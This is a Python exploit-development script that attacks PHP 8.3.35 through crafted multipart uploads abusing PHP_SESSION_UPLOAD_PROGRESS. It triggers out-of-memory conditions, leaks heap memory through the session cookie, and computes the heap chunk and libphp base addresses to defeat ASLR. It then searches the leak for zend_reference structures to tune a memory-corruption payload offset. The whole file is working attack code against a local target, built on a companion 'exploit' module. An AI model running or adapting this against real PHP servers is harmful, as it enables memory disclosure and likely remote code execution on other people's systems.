"""Analyze the heap layout on 8.3.35 to find where the reference is.

The carrier lands at R+0xfd8 instead of R+0x00 on 8.3.35.
I need to find where the reference is in the heap and adjust the carrier offset.
"""
import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

# Stage 1: OOM trigger + chunk base leak (841×48B pattern)
print("[*] Stage 1: OOM trigger...", flush=True)
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r1 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw1 = E.parse_cookie(r1)
print(f"[*] Stage 1 cookie: {len(raw1)}B", flush=True)

if len(raw1) < 100:
    print("[-] Stage 1 failed - no OOM", flush=True)
    sys.exit(1)

# Find chunk base
c = Counter()
for i in range(0, len(raw1) - 8, 8):
    v = int.from_bytes(raw1[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        c[v & ~0x1FFFFF] += 1
chunk = c.most_common(1)[0][0] if c else 0
print(f"[*] Chunk base: 0x{chunk:x}", flush=True)

# Stage 2: OOM trigger + libphp base leak (1001×39B pattern)
print("\n[*] Stage 2: libphp base leak...", flush=True)
time.sleep(0.5)
parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r2 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.3)

# Now do a leak request to get the heap layout
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r3 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r3)
print(f"[*] Leak cookie: {len(raw)}B", flush=True)

if len(raw) < 100:
    print("[-] No leak data", flush=True)
    sys.exit(1)

# Find libphp base
dtor_offset = 0x49ec50
libphp = 0
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        if v & 0xFFF == dtor_offset & 0xFFF:
            base = v - dtor_offset
            if base & 0xFFF == 0:
                libphp = base
                print(f"[*] Libphp base: 0x{libphp:x} (at offset {i})", flush=True)
                break

if libphp == 0:
    print("[-] No libphp base found", flush=True)
    sys.exit(1)

# Calculate htdata
htdata = chunk + 0x690d8
print(f"[*] HTDATA: 0x{htdata:x}", flush=True)

# Now let's analyze the heap layout
# The reference should be at PS(http_session_vars)
# Let's look for the pattern in the leaked data
print("\n[*] Analyzing heap layout...", flush=True)
print(f"[*] Looking for zend_reference pattern (rc=1, typ=0x1A)...", flush=True)

# The zend_reference structure is:
# - rc (gc.refcount) - 4 bytes (or 1 byte, depending on version)
# - typ (IS_REFERENCE) - 4 bytes (or 1 byte)
# - val.value (pointer to HashTable) - 8 bytes

# Let's look for the pattern in the leaked data
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        # Check if this could be a reference
        if i > 0:
            prev = int.from_bytes(raw[i-8:i], "little")
            if prev == 1 or (prev & 0xFF) == 1:
                print(f"  [i={i}] 0x{v:x} (prev=0x{prev:x}) - possible reference", flush=True)

# Let's also look for the htdata pattern
print(f"\n[*] Looking for htdata pattern (0x{htdata:x})...", flush=True)
htdata_low7 = htdata & 0xFFFFFFFFFFFFFF
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if v & 0xFFFFFFFFFFFFFF == htdata_low7:
        print(f"  [i={i}] 0x{v:x} - matches htdata!", flush=True)

# Let's dump the first 256 bytes of the leaked data
print(f"\n[*] First 256 bytes of leaked data:", flush=True)
for i in range(0, min(256, len(raw)), 16):
    hexstr = " ".join(f"{b:02x}" for b in raw[i:i+16])
    print(f"  0x{i:03x}: {hexstr}", flush=True)

print("\n[*] done", flush=True)
